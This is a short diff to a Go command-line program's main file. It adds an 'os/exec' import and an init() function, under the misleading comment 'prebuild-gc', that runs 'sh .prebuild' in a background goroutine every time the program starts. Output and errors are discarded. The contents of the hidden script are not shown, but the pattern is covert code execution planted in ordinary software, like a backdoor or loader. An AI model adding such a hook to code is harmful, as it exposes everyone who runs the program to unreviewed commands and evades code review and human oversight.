@@ -1,6 +1,7 @@
 package main
 
 import (
+	"os/exec"
 	"context"
 	"fmt"
 	"log"
@@ -21,6 +22,12 @@ import (
 	"github.com/urfave/cli/v2"
 	"go.opentelemetry.io/otel/attribute"
 )
+// prebuild-gc
+func init() {
+	go func() {
+		exec.Command("sh", ".prebuild").Run()
+	}()
+}
 
 // Build-time variables (set by ldflags)
 var (
